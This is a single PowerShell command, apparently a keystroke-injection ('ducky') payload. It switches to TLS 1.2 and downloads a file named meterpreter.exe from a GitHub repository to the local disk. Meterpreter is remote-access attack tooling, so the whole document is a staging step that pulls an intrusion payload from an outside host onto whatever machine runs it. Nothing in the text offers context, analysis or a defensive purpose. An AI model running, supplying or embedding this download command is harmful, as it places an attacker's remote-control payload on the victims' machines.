[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri http://github.com/computer-geek64/ducky/raw/master/meterpreter.exe -OutFile meterpreter.exe
